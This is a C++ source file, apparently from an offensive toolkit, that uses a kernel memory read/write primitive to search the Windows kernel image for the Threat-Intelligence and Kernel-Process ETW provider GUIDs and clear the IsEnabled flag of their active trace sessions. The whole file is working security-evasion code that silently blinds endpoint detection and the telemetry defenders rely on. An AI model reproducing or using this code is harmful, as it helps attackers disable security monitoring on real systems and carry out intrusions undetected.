#include "EtwDisable.h"
#include "KernelReadWrite.h"
#include <vector>
#include <cstring>
#include <iostream>

// Minimal NT declarations
extern "C" {
typedef LONG NTSTATUS;
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)

typedef struct _SYSTEM_MODULE_ENTRY {
    PVOID  Reserved1;
    PVOID  Reserved2;
    PVOID  ImageBase;
    ULONG  ImageSize;
    ULONG  Flags;
    USHORT LoadOrderIndex;
    USHORT InitOrderIndex;
    USHORT LoadCount;
    USHORT ModuleNameOffset;
    CHAR   ImageName[256];
} SYSTEM_MODULE_ENTRY, *PSYSTEM_MODULE_ENTRY;

typedef struct _SYSTEM_MODULE_INFORMATION {
    ULONG NumberOfModules;
    SYSTEM_MODULE_ENTRY Modules[1];
} SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;

NTSYSAPI NTSTATUS NTAPI NtQuerySystemInformation(
    ULONG SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
);
}

// TRACE_ENABLE_INFO layout (from evntrace.h)
typedef struct _TRACE_ENABLE_INFO_LOCAL {
    ULONG IsEnabled;
    UCHAR Level;
    UCHAR Reserved1;
    USHORT LoggerId;
    ULONG EnableProperty;
    ULONG Reserved2;
    ULONGLONG MatchAnyKeyword;
    ULONGLONG MatchAllKeyword;
} TRACE_ENABLE_INFO_LOCAL, *PTRACE_ENABLE_INFO_LOCAL;

static bool QueryNtosRange(uint64_t& base, uint32_t& size) {
    base = 0;
    size = 0;

    ULONG len = 0;
    NTSTATUS st = NtQuerySystemInformation(11 /*SystemModuleInformation*/, nullptr, 0, &len);
    if (len == 0) return false;

    std::vector<uint8_t> buf(len);
    st = NtQuerySystemInformation(11, buf.data(), static_cast<ULONG>(buf.size()), &len);
    if (!NT_SUCCESS(st)) return false;

    auto info = reinterpret_cast<PSYSTEM_MODULE_INFORMATION>(buf.data());
    if (info->NumberOfModules == 0) return false;

    base = reinterpret_cast<uint64_t>(info->Modules[0].ImageBase);
    size = info->Modules[0].ImageSize;
    return base != 0 && size != 0;
}

static bool DisableProviderByGuid(KernelReadWrite* rw, const GUID& guid, const char* name) {
    if (!rw) return false;

    uint64_t ntBase = 0;
    uint32_t ntSize = 0;
    if (!QueryNtosRange(ntBase, ntSize)) {
        std::cout << "[-] " << name << ": Failed to query ntoskrnl range" << std::endl;
        return false;
    }

    const size_t chunk = 0x1000;
    std::vector<uint8_t> page(chunk);
    bool found = false;
    uint64_t guidAddr = 0;

    for (uint64_t offset = 0; offset + sizeof(GUID) < ntSize; offset += chunk - sizeof(GUID)) {
        size_t toRead = static_cast<size_t>(std::min<uint64_t>(chunk, ntSize - offset));
        if (!rw->ReadMemory(ntBase + offset, page.data(), toRead)) continue;

        for (size_t i = 0; i + sizeof(GUID) <= toRead; ++i) {
            if (memcmp(page.data() + i, &guid, sizeof(GUID)) == 0) {
                found = true;
                guidAddr = ntBase + offset + i;
                break;
            }
        }
        if (found) break;
    }

    if (!found) {
        std::cout << "[-] " << name << ": GUID not found in kernel image" << std::endl;
        return false;
    }

    uint64_t entry = guidAddr - 0x18;       // GUID at offset 0x18
    uint64_t enableInfoBase = entry + 0x60; // EnableInfo array

    std::cout << "[*] " << name << " GUID at 0x" << std::hex << guidAddr
              << " (entry=0x" << entry << ", EnableInfo=0x" << enableInfoBase << ")" << std::dec << std::endl;

    TRACE_ENABLE_INFO_LOCAL slots[8] = {};
    if (!rw->ReadMemory(enableInfoBase, slots, sizeof(slots))) {
        std::cout << "[-] " << name << ": Failed to read EnableInfo array" << std::endl;
        return false;
    }

    bool cleared = false;
    int active = 0;
    int clearedCount = 0;
    for (int i = 0; i < 8; ++i) {
        if (slots[i].LoggerId != 0 && slots[i].IsEnabled != 0) {
            active++;
            uint64_t isEnabledAddr = enableInfoBase + i * sizeof(TRACE_ENABLE_INFO_LOCAL);
            if (rw->WriteUint32(isEnabledAddr, 0)) {
                cleared = true;
                clearedCount++;
                std::cout << "[+] " << name << ": Cleared IsEnabled for slot " << i
                          << " (LoggerId=" << slots[i].LoggerId << ")" << std::endl;
            } else {
                std::cout << "[-] " << name << ": Failed to clear IsEnabled for slot " << i << std::endl;
            }
        }
    }

    std::cout << "[*] " << name << " sessions: active=" << active << " cleared=" << clearedCount << std::endl;
    if (!cleared) {
        std::cout << "[-] " << name << ": No active sessions were cleared" << std::endl;
    }
    return cleared;
}

bool DisableTiEtwProvider(KernelReadWrite* rw) {
    const GUID tiGuid = {0xF4E1897C, 0xBB5D, 0x5668, {0xF1, 0xD8, 0x04, 0x0F, 0x4D, 0x8D, 0xD3, 0x44}};
    return DisableProviderByGuid(rw, tiGuid, "TI ETW provider");
}

bool DisableKernelProcessEtwProvider(KernelReadWrite* rw) {
    const GUID kpGuid = {0x22FB2CD6, 0x0E7B, 0x422B, {0xA0, 0xC7, 0x2F, 0xAD, 0x1F, 0xD0, 0xE7, 0x16}};
    return DisableProviderByGuid(rw, kpGuid, "Kernel-Process ETW provider");
}
